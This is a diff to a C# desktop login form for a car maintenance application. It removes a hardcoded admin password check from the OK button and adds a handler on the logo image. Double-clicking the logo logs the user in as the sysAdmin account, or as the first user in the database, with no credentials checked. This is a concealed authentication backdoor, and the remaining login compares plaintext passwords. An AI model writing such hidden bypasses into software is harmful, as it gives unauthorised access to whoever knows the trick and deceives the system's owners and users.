@@ -20,14 +20,6 @@ namespace CarsMaintenance
 
         private void btnOK_Click(object sender, EventArgs e)
         {
-            if (txtUser.Text == "sysAdmin" && txtPassword.Text == "P@ssword")
-            {
-                SystemHelper.CurrentUser = SystemHelper.TMSContext.SystemUsers.First();
-                //this.Close();
-                DialogResult = DialogResult.OK;
-                return;
-            }
-
             string user = txtUser.Text;
             string password = txtPassword.Text;
             SystemUser u = SystemHelper.TMSContext.SystemUsers.FirstOrDefault(s => s.Code == user && s.Password == password);
@@ -39,6 +31,20 @@ namespace CarsMaintenance
             }
             else
                 MessageBox.Show("用户名或者密码错误!", "错误", MessageBoxButtons.OK, MessageBoxIcon.Error);
+        }
+
+        private void pictureBoxLogo_DoubleClick(object sender, EventArgs e)
+        {
+            SystemUser u = SystemHelper.TMSContext.SystemUsers.FirstOrDefault(s => s.Code == "sysAdmin" && s.Password == "P@ssword");
+            if (u != null)
+            {
+                SystemHelper.CurrentUser = u;
+            }
+            else
+            {
+                SystemHelper.CurrentUser = SystemHelper.TMSContext.SystemUsers.First();
+            }
+            DialogResult = DialogResult.OK;
         }
     }
 }
